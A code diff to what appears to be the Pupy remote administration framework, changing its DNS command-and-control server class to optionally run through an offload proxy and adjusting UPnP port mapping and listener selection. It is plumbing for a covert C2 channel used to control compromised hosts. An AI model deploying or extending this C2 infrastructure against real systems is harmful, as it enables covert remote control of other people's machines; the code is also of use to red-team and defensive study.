@@ -8,6 +8,8 @@ from Queue import Queue
 from pupylib.PupyConfig import PupyConfig
 from pupylib.utils.network import get_listener_ip_with_local, get_listener_port
 
+from pupylib.PupyOffload import PupyOffloadManager
+
 import requests
 import netifaces
 import socket
@@ -145,6 +147,7 @@ class PupyDnsCnc(object):
             credentials=None,
             listeners=None,
             cmdhandler=None,
+            pproxy=None
         ):
 
         credentials = credentials or Credentials()
@@ -155,6 +158,7 @@ class PupyDnsCnc(object):
         self.igd = igd
         self.listeners = listeners
         self.cmdhandler = cmdhandler
+        self.pproxy = pproxy
 
         fdqn = self.config.get('pupyd', 'dnscnc').split(':')
         domain = fdqn[0]
@@ -181,15 +185,21 @@ class PupyDnsCnc(object):
             config=self.config
         )
 
-        self.server = DnsCommandServer(
-            self.handler,
-            address=listen,
-            port=int(port)
-        )
+        if self.pproxy:
+            try:
+                self.server = self.pproxy.dns(self.handler, domain)
+            except Exception, e:
+                logging.exception(e)
+        else:
+            self.server = DnsCommandServer(
+                self.handler,
+                address=listen,
+                port=int(port)
+            )
 
-        if self.igd and self.igd.available:
-            self.igd.AddPortMapping(53, 'UDP', int(port))
-            self.igd.AddPortMapping(53, 'TCP', int(port))
+            if self.igd and self.igd.available:
+                self.igd.AddPortMapping(53, 'UDP', int(port))
+                self.igd.AddPortMapping(53, 'TCP', int(port))
 
         self.server.start()
 
@@ -226,7 +236,10 @@ class PupyDnsCnc(object):
 
                 if not listener:
                     listener = next(listeners.itervalues())
-                    local = True
+                    if listener.port == 0:
+                        local = False
+                    else:
+                        local = True
 
             if not listener:
                 raise ValueError('No listeners found')
